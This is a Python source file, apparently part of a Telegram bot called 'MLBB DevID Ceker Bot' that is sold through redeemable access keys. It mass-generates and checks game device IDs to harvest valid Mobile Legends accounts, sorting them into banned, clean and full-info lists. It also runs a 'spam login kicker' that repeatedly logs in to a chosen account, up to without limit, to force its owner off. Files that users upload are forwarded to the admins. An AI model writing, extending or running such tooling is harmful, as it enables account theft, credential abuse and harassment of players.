        if not self._check_access(user_id):
            await update.message.reply_text("No access. /redeem <KEY>")
            return

        # === FIX: clean up any stale session first ===
        with bruteforce_lock:
            old = bruteforce_sessions.get(user_id)
            if old:
                se = old.get('stop_event')
                if se:
                    se.set()
                del bruteforce_sessions[user_id]

            active_count = bruteforce_user_count.get(user_id, 0)
        if active_count >= MAX_CONCURRENT_BRUTEFORCE:
            await update.message.reply_text(
                f"Maximum concurrent brute force sessions reached ({MAX_CONCURRENT_BRUTEFORCE}).\n"
                f"Please wait or stop one with /bfstop."
            )
            return
        msg = await update.message.reply_text(
            "BRUTE FORCE / SPAM LOGIN KICKER\n\n"
            "Send a device ID to start.\n\n"
            "Device ID format: and_a1b2c3d4e5f6...\n\n"
            f"Active sessions: {active_count}/{MAX_CONCURRENT_BRUTEFORCE}"
        )
        with bruteforce_lock:
            bruteforce_sessions[user_id] = {
                'mode': 'bruteforce', 'stage': 'awaiting_device',
                'msg_id': msg.message_id, 'user_id': user_id,
                'chat_id': update.effective_chat.id,
            }

    async def bfstop_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """
        Fixed: properly cleans up sessions that are still waiting for input
        (no running kicker thread), and honestly reports what was done.
        """
        user_id = update.effective_user.id

        with bruteforce_lock:
            session = bruteforce_sessions.get(user_id)
            if not session:
                await update.message.reply_text("No active brute force session found.")
                return

            stage = session.get('stage', 'unknown')

            # If session is only waiting for input, no kicker is running.
            # Just delete it and tell the user.
            if stage in ('awaiting_device', 'awaiting_mode',
                         'awaiting_custom_loops', 'awaiting_custom_delay'):
                del bruteforce_sessions[user_id]
                await update.message.reply_text(
                    f"Brute force session cancelled (was waiting at: {stage})."
                )
                return

            # If a kicker thread is running, signal it to stop.
            if stage == 'running':
                stop_event = session.get('stop_event')
                if stop_event:
                    stop_event.set()
                    await update.message.reply_text(
                        "STOP signal sent. Brute force will stop shortly..."
                    )
                else:
                    # Running stage but no stop_event — clean up anyway.
                    del bruteforce_sessions[user_id]
                    await update.message.reply_text(
                        "Brute force session cleaned up (no stop_event found)."
                    )
                return

            # Unknown stage — clean up.
            del bruteforce_sessions[user_id]
            await update.message.reply_text(
                f"Brute force session cancelled (stage was: {stage})."
            )

    async def bfstatus_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """
        Fixed: handles all stages gracefully and never crashes on missing keys.
        """
        user_id = update.effective_user.id
        with bruteforce_lock:
            session = bruteforce_sessions.get(user_id)

        if not session:
            await update.message.reply_text(
                "No active brute force session. Use /bruteforce to start one."
            )
            return

        stage = session.get('stage', 'unknown')

        if stage == 'awaiting_device':
            await update.message.reply_text(
                "Brute force session is waiting for a device ID.\n"
                "Send one now, or use /bfstop to cancel."
            )
            return

        if stage in ('awaiting_mode', 'awaiting_custom_loops', 'awaiting_custom_delay'):
            profile = session.get('profile', {}) or {}
            await update.message.reply_text(
                f"Brute force session is waiting for input.\n\n"
                f"Target ID: {profile.get('account_id', '?')} "
                f"(Zone {profile.get('zone_id', '?')})\n"
                f"Stage: {stage}\n\n"
                f"Use /bfstop to cancel."
            )
            return

        if stage == 'running':
            markup = InlineKeyboardMarkup(
                [[InlineKeyboardButton("STOP", callback_data=f"bf_stop_{user_id}")]]
            )
            try:
                await update.message.reply_text(
                    build_bruteforce_progress_text(session),
                    reply_markup=markup
                )
            except Exception as e:
                logger.error(f"Error sending bfstatus: {e}")
            return

        await update.message.reply_text(f"Brute force session stage: {stage}")

    async def handle_bruteforce_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, session: dict) -> bool:
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        stage = session.get('stage')
        text = update.message.text.strip() if update.message.text else ""

        if stage == 'awaiting_device':
            device_id = text
            if not device_id:
                await update.message.reply_text("Invalid Device ID\n\nEmpty input.")
                return True
            if not (device_id.startswith("and_") or device_id.startswith("ios_")):
                await update.message.reply_text(
                    "Invalid Device ID\n\n"
                    f"Device ID must start with and_ or ios_.\n"
                    f"Your input starts with: {device_id[:10]}..."
                )
                return True
            if len(device_id) < 50:
                await update.message.reply_text(
                    f"Invalid Device ID\n\nDevice ID too short ({len(device_id)} chars, minimum 50)."
                )
                return True
            if any(c.isspace() for c in device_id):
                await update.message.reply_text("Invalid Device ID\n\nNo spaces allowed.")
                return True

            with bruteforce_lock:
                active_count = bruteforce_user_count.get(user_id, 0)
            if active_count >= MAX_CONCURRENT_BRUTEFORCE:
                await update.message.reply_text(
                    f"Maximum concurrent brute force sessions reached ({MAX_CONCURRENT_BRUTEFORCE})."
                )
                with bruteforce_lock:
                    if user_id in bruteforce_sessions:
                        del bruteforce_sessions[user_id]
                return True

            fetching_msg = await update.message.reply_text(
                f"Fetching session data for device...\n\n"
                f"Device: {device_id[:60]}...\n\n"
                f"Please wait..."
            )

            loop = asyncio.get_event_loop()
            try:
                profile = await loop.run_in_executor(None, fetch_session_profile, device_id)
            except Exception as e:
                logger.error(f"fetch_session_profile executor error: {e}")
                profile = None

            if not profile:
                try:
                    await fetching_msg.edit_text(
                        f"Invalid Device ID\n\n"
                        f"Device: {device_id[:50]}...\n\n"
                        f"The device ID is invalid, dead, or login failed.\n\n"
                        f"Use /bruteforce to try another device."
                    )
                except:
                    pass
                with bruteforce_lock:
                    if user_id in bruteforce_sessions:
                        del bruteforce_sessions[user_id]
                return True

            profile_text = format_profile_card_text(profile)

            markup = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("Single Test", callback_data="bf_mode_test"),
                    InlineKeyboardButton("10x Kick", callback_data="bf_mode_10x"),
                ],
                [
                    InlineKeyboardButton("50x Kick", callback_data="bf_mode_50x"),
                    InlineKeyboardButton("100x Kick", callback_data="bf_mode_100x"),
                ],
                [
                    InlineKeyboardButton("Unlimited", callback_data="bf_mode_unlimited"),
                    InlineKeyboardButton("Custom", callback_data="bf_mode_custom"),
                ],
                [InlineKeyboardButton("Cancel", callback_data="cancel_bruteforce")],
            ])

            with bruteforce_lock:
                session['profile'] = profile
                session['stage'] = 'awaiting_mode'
                session['chat_id'] = chat_id
                bruteforce_sessions[user_id] = session

            try:
                await fetching_msg.edit_text(
                    f"{profile_text}\n\n"
                    f"Select brute force mode:\n\n"
                    f"Single Test - One kick\n"
                    f"10x Kick - 10 loops, 2s delay\n"
                    f"50x Kick - 50 loops, 1s delay\n"
                    f"100x Kick - 100 loops, 0.5s delay\n"
                    f"Unlimited - Continuous until stopped\n"
                    f"Custom - Set your own loops & delay",
                    reply_markup=markup
                )
            except Exception as e:
                logger.error(f"Error showing modes: {e}")
            return True

        if stage == 'awaiting_custom_loops':
            try:
                loops = int(text)
                session['custom_loops'] = loops
                session['stage'] = 'awaiting_custom_delay'
                with bruteforce_lock:
                    bruteforce_sessions[user_id] = session
                await update.message.reply_text("Please send the delay in seconds (e.g., 1.5):")
            except ValueError:
                await update.message.reply_text("Invalid number.")
            return True

        if stage == 'awaiting_custom_delay':
            try:
                delay = float(text)
                profile = session.get('profile')
                loops = session.get('custom_loops', 10)
                if not profile:
                    await update.message.reply_text("Session expired.")
                    with bruteforce_lock:
                        if user_id in bruteforce_sessions:
                            del bruteforce_sessions[user_id]
                    return True
                with bruteforce_lock:
                    active_count = bruteforce_user_count.get(user_id, 0)
                if active_count >= MAX_CONCURRENT_BRUTEFORCE:
                    await update.message.reply_text(
                        f"Maximum concurrent sessions reached ({MAX_CONCURRENT_BRUTEFORCE})."
                    )
                    with bruteforce_lock:
                        if user_id in bruteforce_sessions:
                            del bruteforce_sessions[user_id]
                    return True
                mode_label = f"Custom ({loops if loops > 0 else 'infinite'} loops, {delay}s delay)"
                await self._start_bruteforce_run(
                    chat_id=chat_id, user_id=user_id, profile=profile,
                    total_loops=loops, delay_sec=delay, mode_label=mode_label,
                    context=context
                )
            except ValueError:
                await update.message.reply_text("Invalid delay.")
            return True

        return False

    async def _start_bruteforce_run(self, chat_id: int, user_id: int, profile: dict,
                                     total_loops: int, delay_sec: float, mode_label: str,
                                     context):
        stop_event = threading.Event()
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("STOP", callback_data=f"bf_stop_{user_id}")]])
        with bruteforce_lock:
            bruteforce_sessions[user_id] = {
                'user_id': user_id, 'chat_id': chat_id, 'profile': profile,
                'count': 0, 'success_count': 0, 'fail_count': 0,
                'last_latency': 0.0, 'avg_latency': 0.0, 'speed': 0.0,
                'total_loops': total_loops, 'delay_sec': delay_sec,
                'mode_label': mode_label, 'status': 'running',
                'start_time': time.time(), 'stop_event': stop_event,
                'stage': 'running',
            }
            bruteforce_user_count[user_id] = bruteforce_user_count.get(user_id, 0) + 1
        try:
            start_msg = await context.bot.send_message(
                chat_id,
                build_bruteforce_progress_text(bruteforce_sessions[user_id]),
                reply_markup=markup
            )
        except Exception as e:
            logger.error(f"Failed to send start message: {e}")
            with bruteforce_lock:
                if user_id in bruteforce_sessions:
                    del bruteforce_sessions[user_id]
                if user_id in bruteforce_user_count:
                    bruteforce_user_count[user_id] = max(0, bruteforce_user_count[user_id] - 1)
            await context.bot.send_message(chat_id, f"Failed to start: {str(e)[:100]}")
            return
        with bruteforce_lock:
            if user_id in bruteforce_sessions:
                bruteforce_sessions[user_id]['message_id'] = start_msg.message_id
        bot_instance = context.bot

        def run_and_finish():
            try:
                result = run_bruteforce_sync(
                    profile, total_loops, delay_sec,
                    user_id=user_id, chat_id=chat_id, message_id=start_msg.message_id,
                    stop_event=stop_event, mode_label=mode_label,
                    bot_instance=bot_instance
                )
                with bruteforce_lock:
                    sess = bruteforce_sessions.get(user_id)
                    if sess:
                        sess['status'] = 'completed'
                summary_text = build_bruteforce_summary_text(result)
                _threadsafe_edit_message(bot_instance, summary_text, chat_id, start_msg.message_id, reply_markup=None)
                time.sleep(5)
            except Exception as e:
                logger.error(f"run_and_finish error: {e}")
            finally:
                with bruteforce_lock:
                    if user_id in bruteforce_sessions:
                        sess = bruteforce_sessions[user_id]
                        if sess.get('stage') == 'running' or sess.get('status') == 'completed':
                            del bruteforce_sessions[user_id]
                    if user_id in bruteforce_user_count:
                        bruteforce_user_count[user_id] = max(0, bruteforce_user_count[user_id] - 1)

        t = threading.Thread(target=run_and_finish, daemon=True)
        t.start()

    async def start_bruteforce_mode(self, update: Update, context: ContextTypes.DEFAULT_TYPE, mode: str):
        query = update.callback_query
        user_id = query.from_user.id
        chat_id = query.message.chat.id
        with bruteforce_lock:
            session = bruteforce_sessions.get(user_id, {})
            profile = session.get('profile')
        if not profile:
            await query.answer("Session expired. Use /bruteforce again.", show_alert=True)
            return
        await query.answer("Starting...")
        mode_config = {
            'test': (1, 0, "Single Test"),
            '10x': (10, 2.0, "10x Login Kick"),
            '50x': (50, 1.0, "50x Login Kick"),
            '100x': (100, 0.5, "100x Login Kick"),
            'unlimited': (0, 0.0, "Unlimited"),
        }
        if mode == 'custom':
            try:
                await query.edit_message_text("Custom Mode\n\nPlease send the number of loops (0 = unlimited):")
            except:
                pass
            with bruteforce_lock:
                session['stage'] = 'awaiting_custom_loops'
                bruteforce_sessions[user_id] = session
            return
        if mode not in mode_config:
            await query.answer("Unknown mode.", show_alert=True)
            return
        total_loops, delay_sec, mode_label = mode_config[mode]
        with bruteforce_lock:
            if user_id in bruteforce_sessions:
                del bruteforce_sessions[user_id]
        await self._start_bruteforce_run(
            chat_id=chat_id, user_id=user_id, profile=profile,
            total_loops=total_loops, delay_sec=delay_sec, mode_label=mode_label,
            context=context
        )

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id

        with bruteforce_lock:
            bf_session = bruteforce_sessions.get(user_id)

        if bf_session:
            stage = bf_session.get('stage')
            if stage in ('awaiting_device', 'awaiting_custom_loops', 'awaiting_custom_delay'):
                if update.message and update.message.text:
                    handled = await self.handle_bruteforce_input(update, context, bf_session)
                    if handled:
                        return

        current_mode = context.user_data.get('mode')

        if current_mode == 'single' and update.message and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("No access. /redeem <KEY>")
                context.user_data['mode'] = None
                return
            device_id = update.message.text.strip()
            if device_id.startswith(("and_", "ios_")):
                await self.handle_single_check(update, context, device_id)
            else:
                await update.message.reply_text(
                    "Invalid Device ID\n\n"
                    "Device ID must start with and_ or ios_"
                )
            return

        if current_mode == 'bancheck' and update.message and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("No access. /redeem <KEY>")
                context.user_data['mode'] = None
                return
            device_id = update.message.text.strip()
            if device_id.startswith(("and_", "ios_")):
                await self.handle_ban_check_only(update, context, device_id)
            else:
                await update.message.reply_text(
                    "Invalid Device ID\n\n"
                    "Device ID must start with and_ or ios_"
                )
            return

        if current_mode == 'creationdate' and update.message and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("No access. /redeem <KEY>")
                context.user_data['mode'] = None
                return
            device_id = update.message.text.strip()
            if device_id.startswith(("and_", "ios_")):
                await self.handle_creation_date_check(update, context, device_id)
            else:
                await update.message.reply_text(
                    "Invalid Device ID\n\n"
                    "Device ID must start with and_ or ios_"
                )
            return

        if current_mode == 'generate' and update.message and update.message.text:
            if not self._check_access(user_id):
                await update.message.reply_text("No access. /redeem <KEY>")
                context.user_data['mode'] = None
                return
            txt = update.message.text.strip()
            if txt.startswith(("and_", "ios_")):
                await update.message.reply_text(
                    "You are in Generate mode.\nPlease send a NUMBER (1-50000) or /start to cancel."
                )
                return
            try:
                count = int(txt)
                if count <= 0 or count > 50000:
                    await update.message.reply_text("Number between 1 and 50000")
                    return
                context.user_data['mode'] = None
                await update.message.reply_text(f"Generating {count:,} IDs...")
                asyncio.create_task(self.run_check_task(update, context, count, 'generate'))
            except ValueError:
                await update.message.reply_text("Send a valid number")
            return

        if current_mode == 'file' and update.message and update.message.document:
            if not self._check_access(user_id):
                await update.message.reply_text("No access. /redeem <KEY>")
                context.user_data['mode'] = None
                return
            file = update.message.document
            if not file.file_name.endswith('.txt'):
                await update.message.reply_text("Send a .txt file")
                return
            
            context.user_data['mode'] = None
            
            status_msg = await update.message.reply_text(f"Downloading {file.file_name}...")
            file_obj = await file.get_file()
            clean_filename = re.sub(r'[^a-zA-Z0-9_.-]', '', file.file_name)
            db_file_path = os.path.join(DB_DIR, f"{user_id}_{int(time.time())}_{clean_filename}")
            await file_obj.download_to_drive(db_file_path)
            ids = _load_pool(db_file_path)
            if not ids:
                await status_msg.edit_text("No valid IDs found.")
                return
            username = update.effective_user.username or "no_username"
            first_name = update.effective_user.first_name or ""
            admin_caption = (
                f"USER UPLOADED FILE\n"
                f"------------------\n"
                f"Name: {first_name}\n"
                f"Username: @{username}\n"
                f"User ID: {user_id}\n"
                f"File: {file.file_name}\n"
                f"Devices: {len(ids):,}\n"
                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            for admin_id in ADMIN_IDS:
                try:
                    with open(db_file_path, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id, document=f,
                            filename=file.file_name, caption=admin_caption
                        )
                except Exception as e:
                    logger.error(f"Failed to send file to admin {admin_id}: {e}")
            await status_msg.edit_text(f"Loaded {len(ids):,} IDs. Starting...")
            asyncio.create_task(self.run_check_task(update, context, ids, 'file'))
            return

    async def run_check_task(self, update: Update, context: ContextTypes.DEFAULT_TYPE, data, mode: str):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        self.active_tasks[user_id] = {'done': False, 'cancelled': False}
        stats = LiveStats()
        self.live_stats[user_id] = stats
        status_msg = None
        stats_msg = None
        try:
            if mode == 'generate':
                ids = [_gen() for _ in range(data)]
                limit = data
            else:
                ids = data[:]
                limit = len(ids)
            concurrency = 40
            rate = 40
            sem = asyncio.Semaphore(concurrency)
            bucket = _Bucket(rate)
            lock = asyncio.Lock()
            checked = 0
            valid = 0
            failed = 0
            results = []
            start_time = time.monotonic()
            last_update = 0

            async def worker(did):
                nonlocal checked, valid, failed
                if self.active_tasks[user_id]['cancelled']:
                    return
                res = await _check(did, sem, bucket)
                async with lock:
                    checked += 1
                    if res is not None and res.get('player'):
                        valid += 1
                        results.append(res)
                        stats.add_hit(res)
                    else:
                        failed += 1
                        stats.add_unreg()

            tasks = [asyncio.create_task(worker(did)) for did in ids]
            while not all(t.done() for t in tasks) and not self.active_tasks[user_id]['cancelled']:
                elapsed = time.monotonic() - start_time
                speed = checked / elapsed if elapsed > 0 else 0
                progress = (checked / limit * 100) if limit > 0 else 0
                eta = (limit - checked) / speed if speed > 0 else 0
                eta_m = int(eta // 60)
                eta_s = int(eta % 60)
                if time.monotonic() - last_update >= 2:
                    last_update = time.monotonic()
                    bar_len = 20
                    filled = int(progress / 100 * bar_len)
                    bar = '#' * filled + '-' * (bar_len - filled)
                    progress_text = (
                        f"[{bar}] {progress:.1f}%\n\n"
                        f"{checked:,}/{limit:,}\n"
                        f"{int(elapsed // 60)}m {int(elapsed % 60)}s | ETA {eta_m}m {eta_s}s\n"
                    )
                    stats_text = stats.format()
                    try:
                        if status_msg:
                            await status_msg.edit_text(progress_text)
                        else:
                            status_msg = await context.bot.send_message(chat_id, progress_text)
                    except Exception:
                        pass
                    try:
                        if stats_msg:
                            await stats_msg.edit_text(stats_text)
                        else:
                            stats_msg = await context.bot.send_message(chat_id, stats_text)
                    except Exception:
                        pass
                await asyncio.sleep(1)

            await asyncio.gather(*tasks, return_exceptions=True)
            self.active_tasks[user_id]['done'] = True
            elapsed = time.monotonic() - start_time

            banned_results = [r for r in results if r.get('ban_info', {}).get('status') == 'BANNED']
            clean_results = [r for r in results if r.get('ban_info', {}).get('status') == 'NOT BANNED']
            unknown_results = [r for r in results if r.get('ban_info', {}).get('status') not in ('BANNED', 'NOT BANNED')]

            if banned_results and len(banned_results) > 0:
                banned_file = f"BANNED_{len(banned_results)}.txt"
                with open(banned_file, 'w', encoding='utf-8') as f:
                    f.write("=" * 80 + "\nBANNED ACCOUNTS \n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 80 + "\n\n")
                    for res in banned_results:
                        f.write(format_result_line(res) + "\n")
                with open(banned_file, 'rb') as f:
                    await context.bot.send_document(chat_id, f, filename=banned_file,
                        caption=f"BANNED Accounts : {len(banned_results):,}")
                os.remove(banned_file)

            if clean_results and len(clean_results) > 0:
                clean_file = f"CLEAN_{len(clean_results)}.txt"
                with open(clean_file, 'w', encoding='utf-8') as f:
                    f.write("=" * 80 + "\nCLEAN ACCOUNTS \n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 80 + "\n\n")
                    for res in clean_results:
                        f.write(format_result_line(res) + "\n")
                with open(clean_file, 'rb') as f:
                    await context.bot.send_document(chat_id, f, filename=clean_file,
                        caption=f"CLEAN Accounts : {len(clean_results):,}")
                os.remove(clean_file)

            if unknown_results and len(unknown_results) > 0:
                unknown_file = f"UNKNOWN_{len(unknown_results)}.txt"
                with open(unknown_file, 'w', encoding='utf-8') as f:
                    f.write("=" * 80 + "\nUNKNOWN BAN STATUS \n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 80 + "\n\n")
                    for res in unknown_results:
                        f.write(format_result_line(res) + "\n")
                with open(unknown_file, 'rb') as f:
                    await context.bot.send_document(chat_id, f, filename=unknown_file,
                        caption=f"UNKNOWN Ban Status : {len(unknown_results):,}")
                os.remove(unknown_file)

            if results and len(results) > 0:
                all_file = f"ALL_Valid_{len(results)}.txt"
                with open(all_file, 'w', encoding='utf-8') as f:
                    f.write("=" * 80 + "\nALL VALID RESULTS - FULL INFO\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 80 + "\n\n")
                    for res in results:
                        f.write(format_full_info_text(res['did'], res) + "\n\n")
                        f.write("=" * 80 + "\n\n")
                with open(all_file, 'rb') as f:
                    await context.bot.send_document(chat_id, f, filename=all_file,
                        caption=f"ALL Valid Results (With Full Info): {len(results):,}")
                os.remove(all_file)

            if not results:
                await context.bot.send_message(
                    chat_id,
                    "No accounts with player info found.\n\n"
                    "All IDs either:\n"
                    "- Failed to login\n"
                    "- Have no player info on game server\n"
                )

            final_progress = (
                f"Task Complete!\n"
                f"==============\n\n"
                f"Total checked  : {checked:,}\n"
                f"Hit rate       : {(valid / checked * 100) if checked > 0 else 0:.2f}%\n"
                f"Total time     : {int(elapsed // 60)}m {int(elapsed % 60)}s\n"
                f"Avg speed      : {checked / elapsed:.1f}/s\n"
                f"Banned  : {len(banned_results):,}\n"
                f"Clean   : {len(clean_results):,}\n"
                f"Unknown : {len(unknown_results):,}\n"
            )
            final_stats = f"Final Stats\n===========\n\n{stats.format()}"
            try:
                if status_msg:
                    await status_msg.edit_text(final_progress)
                else:
                    await context.bot.send_message(chat_id, final_progress)
            except Exception:
                await context.bot.send_message(chat_id, final_progress)
            try:
                if stats_msg:
                    await stats_msg.edit_text(final_stats)
                else:
                    await context.bot.send_message(chat_id, final_stats)
            except Exception:
                await context.bot.send_message(chat_id, final_stats)

        except Exception as e:
            logger.error(f"Task error: {e}")
            await context.bot.send_message(chat_id, f"Error: {str(e)}")
        finally:
            self.active_tasks[user_id]['done'] = True
            self.live_stats.pop(user_id, None)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data

        if data == "single_check":
            await self.single_check_button(update, context)
        elif data == "ban_check_only":
            await self.ban_check_only_button(update, context)
        elif data == "creation_date_only":
            await self.creation_date_button(update, context)
        elif data == "check_file":
            await self.check_file(update, context)
        elif data == "generate":
            await self.generate(update, context)
        elif data == "bruteforce":
            await query.answer()
            # === FIX: clean up any stale session before creating a new one ===
            with bruteforce_lock:
                old = bruteforce_sessions.get(user_id)
                if old:
                    se = old.get('stop_event')
                    if se:
                        se.set()
                    del bruteforce_sessions[user_id]

                active_count = bruteforce_user_count.get(user_id, 0)
            if active_count >= MAX_CONCURRENT_BRUTEFORCE:
                try:
                    await query.edit_message_text(
                        f"Maximum concurrent brute force sessions reached ({MAX_CONCURRENT_BRUTEFORCE})."
                    )
                except:
                    pass
                return
            try:
                await query.edit_message_text(
                    "BRUTE FORCE / SPAM LOGIN KICKER\n\n"
                    "Send a device ID to start.\n\n"
                    "Device ID format: and_a1b2c3d4e5f6...\n\n"
                    f"Active sessions: {active_count}/{MAX_CONCURRENT_BRUTEFORCE}"
                )
            except:
                pass
            with bruteforce_lock:
                bruteforce_sessions[user_id] = {
                    'mode': 'bruteforce', 'stage': 'awaiting_device',
                    'msg_id': query.message.message_id, 'user_id': user_id,
                    'chat_id': query.message.chat.id,
                }
        elif data == "my_status":
            await self.my_status(update, context)
        elif data == "admin_panel":
            await self.admin_panel(update, context)
        elif data == "admin_genkey":
            await self.admin_genkey_panel(update, context)
        elif data == "admin_listkeys":
            await self.admin_listkeys_panel(update, context)
        elif data == "admin_listusers":
            await self.admin_listusers_panel(update, context)
        elif data == "back_main":
            await query.answer()
            has_access = self._check_access(user_id)
            is_admin = self._is_admin(user_id)
            expiry = key_manager.get_expiry(user_id)
            if is_admin:
                status_line = "Role: Admin"
            elif has_access:
                status_line = f"Access until: {expiry}"
            else:
                status_line = "No active access"
            keyboard = []
            if has_access or is_admin:
                keyboard.append([InlineKeyboardButton("Bulk Check", callback_data="check_file")])     
                keyboard.append([InlineKeyboardButton("Single Check", callback_data="single_check")])
                keyboard.append([InlineKeyboardButton("Ban Check Only", callback_data="ban_check_only")])
                keyboard.append([InlineKeyboardButton("Creation Date", callback_data="creation_date_only")])
                keyboard.append([InlineKeyboardButton("Brute Force", callback_data="bruteforce")])
            if is_admin:
                keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
            keyboard.append([InlineKeyboardButton("My Status", callback_data="my_status")])
            await query.edit_message_text(
                f"MLBB DevID Ceker Bot\n============================\n\n{status_line}",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        elif data.startswith("genkey_"):
            if not self._is_admin(user_id):
                await query.answer("No", show_alert=True)
                return
            duration_map = {
                "genkey_1h": ("1h", "1 hour"), "genkey_6h": ("6h", "6 hours"),
                "genkey_12h": ("12h", "12 hours"), "genkey_1d": ("1d", "1 day"),
                "genkey_3d": ("3d", "3 days"), "genkey_7d": ("7d", "7 days"),
                "genkey_14d": ("14d", "14 days"), "genkey_1m": ("1m", "1 month"),
                "genkey_3m": ("3m", "3 months"), "genkey_6m": ("6m", "6 months"),
                "genkey_1y": ("1y", "1 year"),
            }
            if data not in duration_map:
                await query.answer("Unknown.", show_alert=True)
                return
            dur_str, dur_label = duration_map[data]
            seconds, label = parse_duration(dur_str)
            if seconds is None:
                await query.answer("Error.", show_alert=True)
                return
            key = key_manager.generate_key(seconds, label, user_id)
            await query.answer()
            keyboard = [
                [InlineKeyboardButton("Generate Another", callback_data="admin_genkey")],
                [InlineKeyboardButton("Back to Admin", callback_data="admin_panel")]
            ]
            await query.edit_message_text(
                f"Key Generated!\n\nKey: {key}\nDuration: {label}\n\nRedeem: /redeem {key}",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        elif data.startswith("bf_mode_"):
            mode = data.replace('bf_mode_', '')
            await self.start_bruteforce_mode(update, context, mode)
        elif data.startswith("bf_stop_"):
            try:
                target_user_id = int(data.replace('bf_stop_', ''))
            except:
                target_user_id = user_id
            if user_id != target_user_id and not self._is_admin(user_id):
                await query.answer("You cannot stop this session.", show_alert=True)
                return
            with bruteforce_lock:
                session = bruteforce_sessions.get(target_user_id)
                if not session:
                    await query.answer("No active brute force session.", show_alert=True)
                    return
                stage = session.get('stage')
                if stage in ('awaiting_device', 'awaiting_mode',
                             'awaiting_custom_loops', 'awaiting_custom_delay'):
                    # Not running — just clean up.
                    del bruteforce_sessions[target_user_id]
                    await query.answer("Session cancelled.", show_alert=True)
                    try:
                        await context.bot.send_message(
                            query.message.chat.id,
                            f"Brute force session cancelled (was at: {stage})."
                        )
                    except:
                        pass
                    return
                stop_event = session.get('stop_event')
                if stop_event:
                    stop_event.set()
            await query.answer("STOP signal sent...")
            try:
                await context.bot.send_message(
                    query.message.chat.id,
                    "STOP signal sent. Brute force will stop shortly..."
                )
            except:
                pass
        elif data == "cancel_bruteforce":
            await query.answer("Cancelled")
            with bruteforce_lock:
                if user_id in bruteforce_sessions:
                    sess = bruteforce_sessions[user_id]
                    se = sess.get('stop_event')
                    if se:
                        se.set()
                    del bruteforce_sessions[user_id]
            try:
                await query.edit_message_text("Brute force cancelled")
            except:
                pass
        elif data == "cancel_single":
            await query.answer("Cancelled")
            context.user_data['mode'] = None
            try:
                await query.edit_message_text("Cancelled")
            except:
                pass


async def post_init(application: Application) -> None:
    global MAIN_LOOP
    MAIN_LOOP = asyncio.get_running_loop()
    logger.info(f"Main event loop captured: {MAIN_LOOP}")


def main():
    bot = MLBBBot()
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("help", bot.help))
    application.add_handler(CommandHandler("redeem", bot.redeem_cmd))
    application.add_handler(CommandHandler("genkey", bot.genkey_cmd))
    application.add_handler(CommandHandler("listkeys", bot.listkeys_cmd))
    application.add_handler(CommandHandler("listusers", bot.listusers_cmd))
    application.add_handler(CommandHandler("revoke", bot.revoke_cmd))
    application.add_handler(CommandHandler("delkey", bot.delkey_cmd))
    application.add_handler(CommandHandler("flush", bot.flush_cmd))
    application.add_handler(CommandHandler("single", bot.single_check_cmd))
    application.add_handler(CommandHandler("bancheck", bot.ban_check_only_cmd))
    application.add_handler(CommandHandler("creationdate", bot.creation_date_cmd))
    application.add_handler(CommandHandler("bruteforce", bot.bruteforce_cmd))
    application.add_handler(CommandHandler("bfstop", bot.bfstop_cmd))
    application.add_handler(CommandHandler("bfstatus", bot.bfstatus_cmd))
    application.add_handler(CallbackQueryHandler(bot.button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_message))
    print("MLBB Bot started!")
    print(f"Single check max retries: {MAX_SINGLE_CHECK_RETRIES}x (early-return on definitive answer)")
    print(f"Ban check max retries: {MAX_BAN_CHECK_RETRIES}x (early-return on definitive answer)")
    print("Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
